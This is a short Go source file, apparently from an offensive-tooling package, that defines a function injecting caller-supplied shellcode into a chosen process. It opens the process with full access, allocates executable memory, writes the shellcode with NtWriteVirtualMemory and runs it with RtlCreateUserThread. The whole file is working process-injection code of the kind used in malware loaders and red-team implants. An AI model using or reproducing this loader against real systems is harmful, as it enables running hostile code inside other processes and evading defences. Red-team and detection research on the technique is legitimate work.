package runsc

import (
	"golang.org/x/sys/windows"

	"gitlab.com/mjwhitta/errors"
)

// WithNtAllocateVirtualMemory will launch the provided shellcode
// using NtAllocateVirtualMemory, NtWriteVirtualMemory, and
// RtlCreateUserThread.
func WithNtAllocateVirtualMemory(pid uint32, sc []byte) error {
	var addr uintptr
	var e error
	var pHndl windows.Handle

	// Ensure shellcode was provided
	if len(sc) == 0 {
		return errors.New("no shellcode provided")
	}

	// Get process handle
	if pid == 0 {
		pHndl = windows.CurrentProcess()
	} else {
		if pHndl, e = NtOpenProcess(pid, ProcessAllAccess); e != nil {
			return e
		}
		defer windows.CloseHandle(pHndl)
	}

	// Allocate memory
	addr, e = NtAllocateVirtualMemory(
		pHndl,
		uint64(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if e != nil {
		return e
	}

	// Copy shellcode to allocated memory
	if e = NtWriteVirtualMemory(pHndl, addr, sc); e != nil {
		return e
	}

	// Run shellcode
	_, e = RtlCreateUserThread(pHndl, addr, Suspended)
	return e
}
